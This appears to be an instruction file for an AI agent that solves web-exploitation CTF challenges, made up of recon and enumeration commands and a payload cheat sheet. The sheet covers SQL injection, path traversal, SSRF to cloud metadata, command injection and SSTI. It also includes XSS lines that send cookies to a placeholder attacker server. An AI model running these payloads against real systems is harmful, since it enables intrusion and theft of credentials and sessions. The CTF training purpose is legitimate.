---
name: web-solver
description: Solve web exploitation CTF challenges. Handles SQL injection, authentication bypass, SSRF, XSS, path traversal, API abuse, and web enumeration. Invoke when a challenge involves a web application.
user-invocable: false
allowed-tools: Read, Write, Edit, Bash, Glob, Grep
---

# Web Solver

Systematic web challenge approach.

## Recon (always run first)

```bash
# Check what we're dealing with
curl -sI "$URL"                          # Headers, server, framework
curl -s "$URL" | head -100               # Homepage content
curl -s "$URL/robots.txt"                # Disallowed paths
curl -s "$URL/sitemap.xml"               # Site structure
curl -s "$URL/.git/HEAD"                 # Exposed git repo
```

## Enumeration

```bash
# Directory brute force
feroxbuster -u "$URL" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50

# Targeted fuzzing
ffuf -u "$URL/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
```

## Common Attack Patterns

### SQL Injection
```bash
# Quick test
curl "$URL/login" -d "username=admin' OR 1=1--&password=x"

# Automated
sqlmap -u "$URL/page?id=1" --dump --batch
sqlmap -u "$URL/login" --forms --dump --batch
```

### Authentication Bypass
- Default credentials: `admin:admin`, `admin:password`
- JWT manipulation: Decode at jwt.io, try `alg:none`, weak secrets
- Cookie tampering: Base64 decode cookies, modify role/user fields
- Parameter pollution: `?admin=true`, `?role=admin`

### Path Traversal / LFI
```bash
curl "$URL/page?file=../../../etc/passwd"
curl "$URL/page?file=....//....//....//etc/passwd"  # Filter bypass
curl "$URL/page?file=php://filter/convert.base64-encode/resource=index.php"
```

### SSRF
```bash
curl "$URL/fetch?url=http://127.0.0.1:80"
curl "$URL/fetch?url=file:///etc/passwd"
curl "$URL/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata
```

### Command Injection
```bash
curl "$URL/ping?host=127.0.0.1;id"
curl "$URL/ping?host=127.0.0.1|cat+/flag.txt"
curl "$URL/ping?host=\$(cat+/flag.txt)"
```

### XSS (for challenges requiring it)
```
<script>fetch('https://YOUR_SERVER/'+document.cookie)</script>
<img src=x onerror="fetch('https://YOUR_SERVER/'+document.cookie)">
```

## Source Code Analysis

If source is provided, look for:
- Unsanitized user input in SQL queries
- `eval()`, `exec()`, `system()`, `os.popen()` with user input
- Weak session management (predictable tokens, no CSRF)
- Hardcoded secrets in config files
- Debug endpoints left enabled
- Pickle deserialization, YAML load, template injection (SSTI)

### SSTI (Server-Side Template Injection)
```
{{7*7}}                    # Test: should render 49
{{config}}                 # Flask: dump config
{{''.__class__.__mro__[1].__subclasses__()}}  # Python class traversal
```

## KernelCon Patterns

- Multiple 100pt web challenges (breadth over depth)
- Privilege escalation challenges
- Local exploitation scenarios
- Standard web vulns at lower point values

## Procedure

1. Recon: headers, source, robots.txt, common paths
2. If source code provided → read it, find the vuln
3. If login form → try default creds, then SQLi
4. If file parameter → try LFI/path traversal
5. If API → enumerate endpoints, check auth, test injection
6. If nothing obvious → directory enumeration with feroxbuster
7. Write `solve.py`/`solve.sh` and `flag.txt`
